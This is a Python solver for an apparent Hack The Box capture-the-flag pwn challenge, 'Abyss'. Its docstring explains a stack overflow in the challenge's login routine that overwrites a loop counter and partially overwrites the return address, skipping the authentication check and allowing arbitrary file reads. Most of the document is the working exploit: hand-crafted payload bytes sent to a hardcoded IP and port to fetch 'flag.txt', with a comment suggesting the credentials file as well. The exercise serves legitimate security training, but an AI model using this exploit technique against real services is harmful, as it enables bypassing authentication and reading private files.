#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Abyss (HTB TryOut, pwn, easy) — solver (raw socket, no deps)
============================================================
Login is unbypassable normally (.creds is random 15:15 per deploy). cmd_login's
copy loops are unbounded and NOT null-terminated; the loop counter i lives on the
stack in the write path, so a crafted USER makes the copy overwrite i, "jump over"
saved RBP, and land on the saved return address. We partially overwrite it with
0x4014eb = the `test eax,eax ; jne 0x401500` inside cmd_read, AFTER the
`mov eax,[logged_in]` load — eax!=0 so the login check is skipped and cmd_read
performs an arbitrary file read. We then send the filename "flag.txt".

Sends must not coalesce (main reads cmd(4), cmd_login reads USER(512) then
PASS(512), cmd_read reads filename), so we pause between writes.

Run:  python solve.py 154.57.164.67 31593
"""
import socket, time, struct, sys, re

def solve(host, port):
    cmd   = struct.pack("<I", 0)                                  # LOGIN
    user  = b"USER " + b"a"*(0x5+0xc) + b"\x1c" + b"k"*0xb + b"\xeb\x14\x40"
    pas   = b"PASS " + b"b"*(0x200-5)
    fname = b"flag.txt"                                           # try ".creds" too
    s = socket.create_connection((host, port), timeout=10); s.settimeout(6)
    for chunk in (cmd, user, pas, fname):
        s.sendall(chunk); time.sleep(0.4)
    out = b""
    try:
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
            if b"HTB{" in out: break
    except Exception: pass
    print(out.decode("latin1", "replace"))
    m = re.search(r"HTB\{[^}]*\}", out.decode("latin1", "replace"))
    if m:
        open("final_flag.txt", "w").write(m.group(0) + "\n"); print("FLAG:", m.group(0))
    return m.group(0) if m else None

if __name__ == "__main__":
    h, p = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) == 3 else ("154.57.164.67", 31593)
    solve(h, p)
